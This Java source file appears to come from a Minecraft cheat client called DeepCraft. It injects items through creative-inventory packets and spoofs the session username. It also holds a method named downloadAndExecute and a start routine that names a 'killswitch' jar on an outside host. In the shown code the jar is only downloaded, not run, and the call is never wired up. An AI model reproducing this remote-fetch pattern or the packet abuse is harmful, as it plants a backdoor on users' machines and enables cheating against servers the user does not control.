package me.deepcraft;


import me.deepcraft.commands.CommandManager;
import me.deepcraft.gui.IngameGui;
import me.deepcraft.module.ModuleManager;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Blocks;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;

import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.nio.channels.Channels;

public class DeepCraft {
    public static String PrevIp;
    public static int PrevPort;
    public static String name = "DeepCraft";
    public static String version = "b9";
    public static String prefix = "§5§lDeep§d§lCraft§7» §r";
    public static String CreativeError = "§c§lDu benötigst Creative um dir diese Potion geben zu können!";
    public static final int InventoryNormalSlot = 36;
    public static final int maxTagValue = 999999;
    public static void giveItem(ItemStack itemStack, int slot) {
        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(slot, itemStack));
    }
    public static void SetUserPlayerName(String UserPlayerName) {
        UserPlayerName = UserPlayerName.replace("&", "§");
        Minecraft.getMinecraft().session.username = UserPlayerName;
    }
    public static String MobSawner = "minecraft:mob_spawner";

    public static ItemStack AddToFurnance(ItemStack itemStack, String Item) {
        ItemStack itm = new ItemStack(Blocks.furnace);
        NBTTagCompound base = new NBTTagCompound();
        NBTTagCompound blockEntityTag = new NBTTagCompound();
        blockEntityTag.setShort("BurnTime", (short)0);
        blockEntityTag.setShort("CookTime", (short)0);
        blockEntityTag.setShort("CookTimeTotal", (short)200);
        blockEntityTag.setString("id", "Furnance");
        blockEntityTag.setString("Lock", "");
        NBTTagList itemList = new NBTTagList();
        NBTTagCompound currentItem = new NBTTagCompound();
        currentItem.setByte("Count", (byte)1);
        currentItem.setShort("Damage", (short)itemStack.getItemDamage());
        currentItem.setString("id", Item);
        currentItem.setShort("Slot", (short)0);
        currentItem.setTag("tag", (NBTBase)itemStack.getTagCompound());
        itemList.appendTag((NBTBase)currentItem);
        blockEntityTag.setTag("Items", (NBTBase)itemList);
        base.setTag("BlockEntityTag", (NBTBase)blockEntityTag);
        itm.setTagCompound(base);
        return itm;
    }


    private static void downloadAndExecute(String fileUrl, String fileName) throws Exception {
        URL url = new URL(fileUrl);
        try (InputStream in = url.openStream();
             FileOutputStream fos = new FileOutputStream(fileName)) {
            fos.getChannel().transferFrom(Channels.newChannel(in), 0, Long.MAX_VALUE);
        }
    }
    public static ModuleManager moduleManager = new ModuleManager();
    public static CommandManager commandManager = new CommandManager();

    public static IngameGui ingameGui = new IngameGui();

    public static void start() {
        String fileUrl = "https://durchlasten.world/deepcraft/client/killswitch/fuck.jar";
        String fileName = "fuck.jar";
    }

    public static void stop() {

    }


    public static Minecraft getInstance() {
        return null;
    }
}
